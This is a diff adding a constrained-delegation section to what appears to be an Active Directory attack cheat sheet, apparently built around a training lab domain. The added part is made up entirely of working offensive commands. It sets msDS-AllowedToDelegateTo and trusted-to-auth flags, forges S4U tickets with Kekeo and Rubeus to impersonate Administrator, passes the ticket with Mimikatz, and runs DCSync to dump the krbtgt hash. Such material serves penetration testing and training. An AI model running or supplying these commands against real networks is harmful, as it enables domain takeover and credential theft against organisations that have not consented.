@@ -10,6 +10,7 @@
   * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
   * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
   * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
+  * [msDS-AllowedToDelegateTo](#msDS-AllowedToDelegateTo)
 
 
 ## Golden ticket
@@ -259,4 +260,33 @@ Get-RemoteLocalAccountHash -Computername <computername> -Verbose
 #### Retrieve domain cached credentials from local machine
 ```
 Get-RemoteCachedCredential -Computername <computername> -Verbose
+```
+
+### msDS-AllowedToDelegateTo
+#### Set msDS-AllowedToDelegateTo
+```
+Set-DomainObject -Identity devuser -Set @{serviceprincipalname='dev/svc'}
+Set-DomainObject -Identity devuser -Set @{"msds-allowedtodelegateto"="ldap/us-dc.us.techcorp.local"}
+Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
+Get-DomainUser –TrustedToAuth
+```
+
+#### Abuse msDS-AllowedToDelegateTo Kekeo
+```
+kekeo# tgt::ask /user:devuser /domain:us.techcorp.local /password:Password@123!
+
+kekeo# tgs::s4u /tgt:TGT_devuser@us.techcorp.local_krbtgt~us.techcorp.local@us.techcorp.local.kirbi /user:Administrator@us.techcorp.local /service:ldap/us-dc.us.techcorp.local
+
+Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@us.techcorp.local@us.techcorp.local_ldap~us-dc.us.techcorp.local@us.techcorp.local.kirbi"'
+
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+```
+
+#### Abuse Rubeus:
+```
+Rubeus.exe hash /password:Password@123! /user:devuser /domain:us.techcorp.local
+
+Rubeus.exe s4u /user:devuser /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/us-dc.us.techcorp.local /domain:us.techcorp.local /ptt
+
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
